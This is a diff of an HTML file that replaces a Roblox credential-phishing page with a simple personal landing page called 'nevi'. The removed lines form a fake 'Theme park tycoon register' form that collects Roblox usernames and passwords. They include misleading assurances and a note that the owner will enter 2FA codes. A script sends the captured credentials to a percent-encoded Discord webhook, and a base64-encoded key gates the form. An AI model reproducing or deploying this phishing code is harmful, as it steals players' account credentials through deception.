@@ -1,15 +1,23 @@
-
-
-
+<!DOCTYPE html>
 <html>
-  <head>
-   <meta charset="utf-8">
-    <style>
-      body {
+<head>
+  <meta charset="utf-8">
+  <title>nevi</title>
+  <style>
+    /* Add some fancy font styles */
+  @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@500&display=swap');
+body {
+  font-family: 'Roboto Mono', monospace;
+  color: white;
+   /* Add this line to make the body scrollable */
+  height: 200px;
+}
 
-        font-family: sans-serif;
-        color:white;
-  background-image: url('https://images.pexels.com/photos/2387793/pexels-photo-2387793.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1');
+/* Add a cool parallax scrolling effect to the background image */
+
+
+.bg-image {
+  background-image: url('https://www.wallpaperflare.com/static/133/604/932/fantasy-art-digital-art-space-art-space-wallpaper.jpg');
   background-size: cover;
   background-position: center;
   height: 100vh;
@@ -19,18 +27,23 @@
   left: 0;
   z-index: -1;
   filter: brightness(66%);
-  overflow-y: scroll;
-      }
-
-html, body {
-  overflow-y: auto;
-  overflow-x: hidden;
 }
-
-      h1 {
-        color: #ffffff;
-      }
-         .btn {
+.frame {
+  border: 2px solid black;  /* create a border around the frame */
+  box-shadow: 0 0 20px 10px blue;  /* add a glowing effect with a blue color */
+  border-radius: 12px;  /* add smooth round edges */
+}
+    /* Add some spacing and styling to the content */
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 50px;
+      text-align: center;
+    }
+  
+  
+    /* Add some hover effects and a glowing effect to the buttons */
+    .btn {
       display: inline-block;
       padding: 10px 20px;
       text-decoration: none;
@@ -40,146 +53,73 @@ html, body {
       color: white;
       background-color: transparent;
       cursor: pointer;
-       transition-duration: 1s;
+      transition: background-color 0.4s; box-shadow 0.4s;
       box-shadow: 0 0 55px #0000FF;
     }
     .btn:hover {
       background-color: #0000FF;
-      box-shadow: 0 0 12px #0000FF;
+      box-shadow: 0 0 12px #000000;
     }
     .btn:active {
-      background-color: #00006C;
-      box-shadow: 0 0 2px #00006C;
+      box-shadow: 0 0 40px #0000FF;
+      transform: scale(0.95);
     }
-      .form-container {
-        width: 500px;
-        margin: 0 auto;
-        background-color: black;
-        border-radius: 10px;
+
+    /* Add some responsive styling */
+    @media (max-width: 600px) {
+      .container {
         padding: 20px;
-        box-shadow: 0 5px 33px rgba(0, 0, 0, 666565);
-         transition-duration: 1s;
       }
-       .form-container:hover {
-      background-color: #060606;
-      box-shadow: 0 0 9px #060606;
-      
-    }
-       .form-container2 {
-    width: 500px;
-        margin: 0 auto;
-        background-color: black;
-        border-radius: 10px;
-        padding: 20px;
-        box-shadow: 0 5px 33px rgba(0, 0, 0, 666565);
-         transition-duration: 1s;
-  
+      h1 {
+        font-size: 24px;
       }
-         .form-container2:hover {
-      background-color: #060606;
-      box-shadow: 0 0 9px #060606;
-      
-    }
-      input[type="text"] {
-        width: 100%;
-        border: none;
-        border-bottom: 2px solid #00b8d4;
-        font-size: 20px;
-        padding: 10px;
-        margin-bottom: 20px;
-
-      }
-
-         input[type="password"] {
-        width: 100%;
-        border: none;
-        border-bottom: 2px solid #00b8d4;
-        font-size: 20px;
-        padding: 10px;
-        margin-bottom: 20px;
-      }
-
-      .error {
-        color: #ff0000;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="form-container">
-      <h1 style=color:white>Theme park tycoon register</h1>
-       <p style=color:gray>This script uses Prying login. Any use of a fake  login will result to your account getting blacklisted!</p>
-      <p style=color:red>NOTICE:THIS ONLY WORKS IF U USE THE ACCOUNT U BOUGHT THE GAMEPASS WITH!</p>
-      <form>
-        Roblox username: <input type="text" id="message"><br>
-        Roblox password: <input type="password" id="name"><br>
-        Register key:<input type="text" id="key"<br>
-       
-
-      <a class="btn" value="Calculate" onclick="sendMessage()">Register</a>
-       </div>
-      </form>
-      <p class="error" id="error"></p>
-    </div>
-      <div class="form-container2">
-       
-        <p style=color:yellow;text-align:center;font-size:xx-large>INFORMATION</p>
-        <div>
-        <strong style=color:white>It is important to note that any changes to your account password or username must be approved by the owner. Please ensure that you have obtained the necessary permission before attempting to make any changes to your login information. If you have any questions or concerns, please do not hesitate to contact the owner or support team for assistance</strong>
-        <p>If your account has two-factor authentication (2FA) enabled, the owner will be responsible for manually entering the 2FA code during the login process. Please be assured that the owner does not have access to your account password and takes measures to ensure the confidentiality of your login information.
-        </p>
-               <p style=color:white>In order to ensure the security and confidentiality of your account, we require your username and password. This is to verify that you are the sole authorized user of this account and to prevent unauthorized sharing.</p>
-                              <p style=color:white>This login is provided to select individuals for use on specific projects. It is not intended for public use at this time. We cannot provide an estimated timeline for when it may become available to the public. In the meantime, we ask that you respect the exclusivity of this login and use it only for the purposes for which it was intended.</p>
-                              <p style=color:white>To ensure the security of your account and prevent unauthorized access, we have implemented several measures including limiting access to a select group of trusted individuals and utilizing scripts such as Potato Hub, Theme Park Tycoon 2 Script, Iris Hub, and Wally Revamped. We are committed to protecting your account from potential phishing attacks and other security threats.</p>
-   <p style=color:white>Prying Login is owned and maintained by a team of individuals who have chosen to keep their identities private. We are committed to ensuring the security and confidentiality of our users' accounts and have implemented measures such as limiting access to a select group of trusted individuals and utilizing scripts to protect against potential security threats.</p>
-    <p style=color:white>If you have entered the wrong username by accident, you may be unable to access your account. In this case, it is recommended that you contact the owner of the script or the support team for assistance in resolving the issue. They may be able to provide further guidance or assistance in resetting your login credentials.</p>
-    <script>
-      // Define a word blacklist
-
-      // Error message
-	var errorinfo = "Error: Please contact the owner."
-      function sendMessage() {
-        // Get the message and name from the input fields
-        var message = document.getElementById("message").value;
-        var name = document.getElementById("name").value;
-
-        // Check if the message or name is too long
-
-        // Check if the message contains a link
-        if (message.includes("http://") || message.includes("https://")) {
-          document.getElementById("error").innerHTML = "Error: Please contact the owner.";
-          return;
-        }
-var key3 = "R0pLTC1UWUZWLU5CTUMtWFowMS0yMzQ1LTY3ODk=";
-
-var encoded = atob(key3);
-if (document.getElementById('key').value != encoded) {
-alert("We apologize for the inconvenience. It appears that we are unable to locate your key. This may be a system error. Please contact the owner or support team for assistance in resolving this issue.")
-} else {
-   document.getElementById("error").innerHTML = "";
-alert("Account validation has been initiated and is expected to take 2-5 minutes to complete. Please note that attempting to register multiple accounts using the same key may result in blacklisting. Thank you for your cooperation.")
-      // Set the webhook URL
-      var webhook = "https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1057673672799825920%2F9zCW_gyUAwlVRP_vjcOYmKeTwHm738PxA8AgiO_JsXVdewhPFkqpx30K79TQZFDHuQ-6";
-//Sends to server to add account to data base for further login
-var decodedString = decodeURIComponent(webhook);
-      // Send a request to get passwords, usernames to check if account valid
-      fetch(decodedString, {
-        method: 'POST',
-
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          username: message,
-          "avatar_url": "https://i.imgur.com/oBPXx0D.png",
-          content: name
-        })
-      });
     }
 
-}
-      // Clear any previous error messages
+    /* Add a black frame with transparency and a glowing effect */
+    .frame {
+      display: inline-block;
+      padding: 1px 100px;
+      border: none;
+      border-radius: none;
+      background-color: rgba(0, 0, 0, 0.6);
+      box-shadow: 0 0 12px black;
+    }
+    
 
+  </style>
+</head>
+<body>
+  <!-- Add a cool parallax scrolling background image -->
+  <div class="bg-image"></div>
 
-  </script>
+  <!-- Add some content in a container -->
+  <div class="container">
+    <h1>nevi</h1>
+    <a>When I want to say something is is listed below</a>
+  <p class="frame">
+  <!-- content goes here -->
+  <a id="myDiv">
+  Uh... we ran into a problem. The live text is broken or down. this will be fixed shortyl. mean while check your internet/refresh and see if that fixes it!
+  </a>
+  <!-- content ends here -->
+</p>
+<div>
+<img src="https://media.discordapp.net/attachments/1054303941434806273/1055454552222089227/standard_2.gif">
+    <div>
+<img src="https://media.discordapp.net/attachments/1013918700052697200/1055415411287531520/standard_3.gif">
+    <div>
+      <!-- Add a button with a link to Discord and an effect when clicked -->
+      <a href="https://discord.gg/cMpWsUSRtr" target="_blank" 		          class="btn">DISCORD</a>
+       <a href="RobuxCalculator.html"class="btn">Tax Calculator</a >		          
+    <a href="discordweb.html"class="btn">Webhook sender</a >
+      <a href="PryingRegister.html"class="btn">TPT2 regsiter</a >
+      </body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 
-</html>
+   
+     <script>
+  // Use jQuery to retrieve the raw text from a pastebin and set it as the text content of the element with the ID "myDiv"
+  $.get("https://raw.githubusercontent.com/Skrrtz/trax/main/live.txt", function(data) {
+    $("#myDiv").text(data);
+  });
+</script>
